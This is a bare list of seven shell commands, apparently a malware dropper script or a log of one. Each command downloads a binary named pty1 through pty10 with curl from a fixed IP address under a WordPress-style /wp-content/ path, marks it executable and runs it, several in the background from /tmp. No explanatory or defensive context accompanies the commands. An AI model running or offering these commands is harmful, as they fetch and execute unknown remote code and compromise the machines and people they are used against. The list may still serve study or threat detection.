curl http://139.180.185.248/wp-content/pty10 -o pty10 ; chmod +x pty10 ; chmod 700 pty10 ; ./pty10
curl http://139.180.185.248/wp-content/pty3 -o pty3; chmod +x pty3 ; chmod 700 pty3 ; ./pty3
curl http://139.180.185.248/wp-content/pty4 -o pty4; chmod +x pty4 ; chmod 700 pty4 ; ./pty4
curl http://139.180.185.248/wp-content/pty10 -o /tmp/pty10 ; chmod +x /tmp/pty10 ; chmod 700 /tmp/pty10 ; /tmp/pty10 &
curl http://139.180.185.248/wp-content/pty1 -o /tmp/pty1; chmod +x /tmp/pty1; chmod 700 /tmp/pty1; /tmp/pty1 &
curl http://139.180.185.248/wp-content/pty2 -o /tmp/pty2; chmod +x /tmp/pty2; chmod 700 /tmp/pty2; /tmp/pty2 &
curl http://139.180.185.248/wp-content/pty5 -o /tmp/pty5; chmod +x /tmp/pty5; chmod 700 /tmp/pty5; /tmp/pty5 &
